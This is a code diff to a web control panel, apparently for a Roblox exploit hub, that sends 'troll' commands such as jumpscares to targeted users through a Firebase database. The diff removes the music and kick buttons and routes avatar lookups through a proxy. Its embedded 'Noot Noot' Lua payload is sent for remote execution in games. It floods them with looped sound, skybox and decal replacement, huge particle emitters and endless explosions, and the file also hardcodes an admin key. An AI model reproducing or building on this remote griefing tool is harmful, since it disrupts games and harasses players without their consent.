@@ -56,7 +56,6 @@
   .b-music { background: #8957e5; }
   .b-pat { background: #b3541e; }
   .b-troll { background: linear-gradient(90deg, #da3633, #8957e5); }
-  .b-noot { background: linear-gradient(90deg, #1a8fff, #3fb950); }
   .modal-bg { position: fixed; inset: 0; background: rgba(0,0,0,.7); z-index: 9998; display: none; align-items: center; justify-content: center; }
   .modal-bg.show { display: flex; }
   .modal {
@@ -88,10 +87,7 @@
   .troll-btn .icon { font-size: 24px; }
   .troll-btn.pat { background: linear-gradient(135deg, #b3541e, #da3633); }
   .troll-btn.scare { background: linear-gradient(135deg, #9e6a03, #da3633); }
-  .troll-btn.music { background: linear-gradient(135deg, #8957e5, #1f6feb); }
-  .troll-btn.kick { background: linear-gradient(135deg, #da3633, #f85149); }
-  .troll-input { width: 100%; padding: 8px 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: #fff; font-size: 12px; margin-top: 8px; outline: none; }
-  .troll-input:focus { border-color: #58a6ff; }
+  .troll-btn.noot { background: linear-gradient(135deg, #1a8fff, #3fb950); }
   .modal-footer { text-align: center; padding: 0 20px 16px; font-size: 11px; color: #484f58; }
   .empty { color: #8b949e; font-size: 14px; padding: 30px 0; text-align: center; }
   h2 { font-size: 16px; color: #8b949e; margin: 22px 0 12px; }
@@ -151,15 +147,11 @@
       </div>
       <div class="modal-body">
         <div class="modal-label">Scripts Troll</div>
-        <div class="troll-grid">
+        <div class="troll-grid" style="grid-template-columns:1fr">
           <button class="troll-btn pat" data-troll="patricio"><span class="icon">🐽</span>Patricio</button>
+          <button class="troll-btn noot" data-troll="nootnoot"><span class="icon">🐧</span>Noot Noot</button>
           <button class="troll-btn scare" data-troll="jumpscare"><span class="icon">👹</span>Jumpscare</button>
-          <button class="troll-btn music" data-troll="music"><span class="icon">🎵</span>Música</button>
-          <button class="troll-btn kick" data-troll="kick"><span class="icon">👢</span>Kick</button>
-          <button class="troll-btn noot" data-troll="nootnoot" style="grid-column:1/-1"><span class="icon">🐧</span>Noot Noot</button>
         </div>
-        <input class="troll-input" id="trollMusicInput" placeholder="Sound ID (para música, opcional)" style="display:none">
-        <input class="troll-input" id="trollKickInput" placeholder="Motivo del kick (opcional)" style="display:none">
       </div>
       <div class="modal-footer">Creado por Xplort ✓</div>
     </div>
@@ -169,7 +161,7 @@
   var ADMIN_KEY = "EXPLHUB_XPLORT_2026";
   var EXPECTED_HASH = "8a504d6625ad4323decbec43f1415168a98897c3199e8265cf949a5004a84025";
 
-  var NOOT_NOOT_SCRIPT = 'local msg = Instance.new("Message",workspace)\nmsg.Text = "Created By SageOfMumsV2 (Pingu) And Xeradius (AzuLX). - Noot Noot Script"\nwait(2)\nmsg:Destroy()\n\npingudecal = "http://www.roblox.com/asset/?id=382332426"\nlocal didpingu = true\n\nfor i,v in pairs(game.Players:GetChildren()) do\n\tif v:IsA("Player") then\n\t\tlocal nooties = Instance.new("Sound", workspace)\n\t\tnooties.SoundId = "rbxassetid://109928136872365"\n\t\tnooties.Volume = 1\n\t\tnooties.Looped = true\n\t\tnooties.PlaybackSpeed = 0.97\n\n\t\tlocal pitch = Instance.new("PitchShiftSoundEffect")\n\t\tpitch.Octave = 1.22\n\t\tpitch.Parent = nooties\n\n\t\tnooties:Play()\n\tend\nend\n\nwait(12)\n\nlocal Sky = Instance.new("Sky", game.Lighting)\nSky.SkyboxBk = pingudecal\nSky.SkyboxDn = pingudecal\nSky.SkyboxFt = pingudecal\nSky.SkyboxLf = pingudecal\nSky.SkyboxRt = pingudecal\nSky.SkyboxUp = pingudecal\n\nlocal function modelasd()\n\tfor i,v in pairs(workspace:GetChildren()) do\n\t\tif v:IsA("Model") then\n\t\t\tfor i,a in pairs(v:GetChildren()) do\n\t\t\t\tlocal top = Instance.new("Decal",a)\n\t\t\t\ttop.Face = "Top"\n\t\t\t\ttop.Texture = pingudecal\n\n\t\t\t\tlocal btm = Instance.new("Decal",a)\n\t\t\t\tbtm.Face = "Bottom"\n\t\t\t\tbtm.Texture = pingudecal\n\n\t\t\t\tlocal lft = Instance.new("Decal",a)\n\t\t\t\tlft.Face = "Left"\n\t\t\t\tlft.Texture = pingudecal\n\n\t\t\t\tlocal rft = Instance.new("Decal",a)\n\t\t\t\trft.Face = "Right"\n\t\t\t\trft.Texture = pingudecal\n\n\t\t\t\tlocal frnt = Instance.new("Decal",a)\n\t\t\t\tfrnt.Face = "Front"\n\t\t\t\tfrnt.Texture = pingudecal\n\n\t\t\t\tlocal bk = Instance.new("Decal",a)\n\t\t\t\tbk.Face = "Back"\n\t\t\t\tbk.Texture = pingudecal\n\n\t\t\t\tlocal VTest = Instance.new("ParticleEmitter")\n\t\t\t\tVTest.Parent = a\n\t\t\t\tVTest.Texture = pingudecal\n\t\t\t\tVTest.Speed = NumberRange.new(200)\n\t\t\t\tVTest.Rate = 200\n\t\t\t\tVTest.Size = NumberSequence.new(10000,10000)\n\t\t\t\tVTest.Lifetime = NumberRange.new(1000)\n\n\t\t\t\tlocal pepe = coroutine.create(function()\n\t\t\t\t\twhile wait() do\n\t\t\t\t\t\tlocal Explosion = Instance.new("Explosion",a)\n\t\t\t\t\t\tExplosion.BlastRadius = 10000\n\t\t\t\t\tend\n\t\t\t\tend)\n\t\t\t\tcoroutine.resume(pepe)\n\t\t\tend\n\t\tend\n\tend\nend\n\nlocal function partasd()\n\tfor i,a in pairs(workspace:GetChildren()) do\n\t\tlocal top = Instance.new("Decal",a)\n\t\ttop.Face = "Top"\n\t\ttop.Texture = pingudecal\n\n\t\tlocal btm = Instance.new("Decal",a)\n\t\tbtm.Face = "Bottom"\n\t\tbtm.Texture = pingudecal\n\n\t\tlocal lft = Instance.new("Decal",a)\n\t\tlft.Face = "Left"\n\t\tlft.Texture = pingudecal\n\n\t\tlocal rft = Instance.new("Decal",a)\n\t\trft.Face = "Right"\n\t\trft.Texture = pingudecal\n\n\t\tlocal frnt = Instance.new("Decal",a)\n\t\tfrnt.Face = "Front"\n\t\tfrnt.Texture = pingudecal\n\n\t\tlocal bk = Instance.new("Decal",a)\n\t\tbk.Face = "Back"\n\t\tbk.Texture = pingudecal\n\n\t\tlocal VTest = Instance.new("ParticleEmitter")\n\t\tVTest.Parent = a\n\t\tVTest.Texture = pingudecal\n\t\tVTest.Speed = NumberRange.new(200)\n\t\tVTest.Rate = 200\n\t\tVTest.Lifetime = NumberRange.new(1000)\n\t\tVTest.Size = NumberSequence.new(10000,10000)\n\n\t\tlocal pepe = coroutine.create(function()\n\t\t\twhile wait() do\n\t\t\t\tif a.Name ~= "Head" or "Torso" or "Left Arm" or "Right Arm" or "Left Leg" or "Right Leg" then\n\t\t\t\t\tlocal Explosion = Instance.new("Explosion",a)\n\t\t\t\t\tExplosion.BlastRadius = 10000\n\t\t\t\tend\n\t\t\tend\n\t\tend)\n\t\tcoroutine.resume(pepe)\n\tend\nend\n\npartasd()\nmodelasd()';
+  var NOOT_NOOT_SCRIPT = 'pingudecal = "http://www.roblox.com/asset/?id=382332426"\nlocal didpingu = true\n\nfor i,v in pairs(game.Players:GetChildren()) do\n\tif v:IsA("Player") then\n\t\tlocal nooties = Instance.new("Sound", workspace)\n\t\tnooties.SoundId = "rbxassetid://109928136872365"\n\t\tnooties.Volume = 1\n\t\tnooties.Looped = true\n\t\tnooties.PlaybackSpeed = 0.97\n\n\t\tlocal pitch = Instance.new("PitchShiftSoundEffect")\n\t\tpitch.Octave = 1.22\n\t\tpitch.Parent = nooties\n\n\t\tnooties:Play()\n\tend\nend\n\nwait(12)\n\nlocal Sky = Instance.new("Sky", game.Lighting)\nSky.SkyboxBk = pingudecal\nSky.SkyboxDn = pingudecal\nSky.SkyboxFt = pingudecal\nSky.SkyboxLf = pingudecal\nSky.SkyboxRt = pingudecal\nSky.SkyboxUp = pingudecal\n\nlocal function modelasd()\n\tfor i,v in pairs(workspace:GetChildren()) do\n\t\tif v:IsA("Model") then\n\t\t\tfor i,a in pairs(v:GetChildren()) do\n\t\t\t\tlocal top = Instance.new("Decal",a)\n\t\t\t\ttop.Face = "Top"\n\t\t\t\ttop.Texture = pingudecal\n\n\t\t\t\tlocal btm = Instance.new("Decal",a)\n\t\t\t\tbtm.Face = "Bottom"\n\t\t\t\tbtm.Texture = pingudecal\n\n\t\t\t\tlocal lft = Instance.new("Decal",a)\n\t\t\t\tlft.Face = "Left"\n\t\t\t\tlft.Texture = pingudecal\n\n\t\t\t\tlocal rft = Instance.new("Decal",a)\n\t\t\t\trft.Face = "Right"\n\t\t\t\trft.Texture = pingudecal\n\n\t\t\t\tlocal frnt = Instance.new("Decal",a)\n\t\t\t\tfrnt.Face = "Front"\n\t\t\t\tfrnt.Texture = pingudecal\n\n\t\t\t\tlocal bk = Instance.new("Decal",a)\n\t\t\t\tbk.Face = "Back"\n\t\t\t\tbk.Texture = pingudecal\n\n\t\t\t\tlocal VTest = Instance.new("ParticleEmitter")\n\t\t\t\tVTest.Parent = a\n\t\t\t\tVTest.Texture = pingudecal\n\t\t\t\tVTest.Speed = NumberRange.new(200)\n\t\t\t\tVTest.Rate = 200\n\t\t\t\tVTest.Size = NumberSequence.new(10000,10000)\n\t\t\t\tVTest.Lifetime = NumberRange.new(1000)\n\n\t\t\t\tlocal pepe = coroutine.create(function()\n\t\t\t\t\twhile wait() do\n\t\t\t\t\t\tlocal Explosion = Instance.new("Explosion",a)\n\t\t\t\t\t\tExplosion.BlastRadius = 10000\n\t\t\t\t\tend\n\t\t\t\tend)\n\t\t\t\tcoroutine.resume(pepe)\n\t\t\tend\n\t\tend\n\tend\nend\n\nlocal function partasd()\n\tfor i,a in pairs(workspace:GetChildren()) do\n\t\tlocal top = Instance.new("Decal",a)\n\t\ttop.Face = "Top"\n\t\ttop.Texture = pingudecal\n\n\t\tlocal btm = Instance.new("Decal",a)\n\t\tbtm.Face = "Bottom"\n\t\tbtm.Texture = pingudecal\n\n\t\tlocal lft = Instance.new("Decal",a)\n\t\tlft.Face = "Left"\n\t\tlft.Texture = pingudecal\n\n\t\tlocal rft = Instance.new("Decal",a)\n\t\trft.Face = "Right"\n\t\trft.Texture = pingudecal\n\n\t\tlocal frnt = Instance.new("Decal",a)\n\t\tfrnt.Face = "Front"\n\t\tfrnt.Texture = pingudecal\n\n\t\tlocal bk = Instance.new("Decal",a)\n\t\tbk.Face = "Back"\n\t\tbk.Texture = pingudecal\n\n\t\tlocal VTest = Instance.new("ParticleEmitter")\n\t\tVTest.Parent = a\n\t\tVTest.Texture = pingudecal\n\t\tVTest.Speed = NumberRange.new(200)\n\t\tVTest.Rate = 200\n\t\tVTest.Lifetime = NumberRange.new(1000)\n\t\tVTest.Size = NumberSequence.new(10000,10000)\n\n\t\tlocal pepe = coroutine.create(function()\n\t\t\twhile wait() do\n\t\t\t\tif a.Name ~= "Head" or "Torso" or "Left Arm" or "Right Arm" or "Left Leg" or "Right Leg" then\n\t\t\t\t\tlocal Explosion = Instance.new("Explosion",a)\n\t\t\t\t\tExplosion.BlastRadius = 10000\n\t\t\t\tend\n\t\t\tend\n\t\tend)\n\t\tcoroutine.resume(pepe)\n\tend\nend\n\npartasd()\nmodelasd()';
 
   firebase.initializeApp({
     databaseURL: "https://explhub-default-rtdb.firebaseio.com"
@@ -226,10 +218,12 @@
     } catch (e) {}
   }
 
+  var AVATAR_PROXY = "https://apis.roproxy.com";
+
   function loadAvatar(uid) {
     if (avatarCache[uid]) return;
     avatarCache[uid] = "pending";
-    fetch("https://thumbnails.roblox.com/v1/users/avatar-headshot?userId=" + encodeURIComponent(uid) + "&size=150x150&format=Png&isCircular=false")
+    fetch(AVATAR_PROXY + "/v1/users/avatar-headshot?userId=" + encodeURIComponent(uid) + "&size=150x150&format=Png&isCircular=false")
       .then(function(r) { return r.json(); })
       .then(function(j) {
         if (j && j.data && j.data[0] && j.data[0].imageUrl) {
@@ -413,7 +407,7 @@
       img.src = cached; img.style.display = "block";
     } else {
       img.style.display = "none";
-      fetch("https://thumbnails.roblox.com/v1/users/avatar-headshot?userId=" + encodeURIComponent(uid) + "&size=150x150&format=Png&isCircular=false")
+      fetch(AVATAR_PROXY + "/v1/users/avatar-headshot?userId=" + encodeURIComponent(uid) + "&size=150x150&format=Png&isCircular=false")
         .then(function(r) { return r.json(); })
         .then(function(j) {
           if (j && j.data && j.data[0] && j.data[0].imageUrl) {
@@ -421,8 +415,6 @@
           }
         }).catch(function() {});
     }
-    document.getElementById("trollMusicInput").style.display = "none";
-    document.getElementById("trollKickInput").style.display = "none";
     document.getElementById("trollModal").classList.add("show");
   }
   document.getElementById("modalClose").addEventListener("click", function() {
@@ -444,19 +436,6 @@
       } else if (action === "jumpscare") {
         pushCmd(trollModalUid, "jumpscare", { imageId: "10509128628", soundId: "" });
         toast("Jumpscare enviado ✓");
-        document.getElementById("trollModal").classList.remove("show");
-      } else if (action === "music") {
-        var inp = document.getElementById("trollMusicInput");
-        if (inp.style.display === "none") { inp.style.display = "block"; inp.focus(); return; }
-        var id = inp.value || "";
-        pushCmd(trollModalUid, "music", { assetId: id, volume: "3" });
-        toast(id ? "Música enviada ✓" : "Música detenida ✓");
-        document.getElementById("trollModal").classList.remove("show");
-      } else if (action === "kick") {
-        var ki = document.getElementById("trollKickInput");
-        if (ki.style.display === "none") { ki.style.display = "block"; ki.focus(); return; }
-        pushCmd(trollModalUid, "kick", { reason: ki.value || "" });
-        toast("Kick enviado ✓");
         document.getElementById("trollModal").classList.remove("show");
       } else if (action === "nootnoot") {
         pushCmd(trollModalUid, "nootnoot", { script: NOOT_NOOT_SCRIPT });
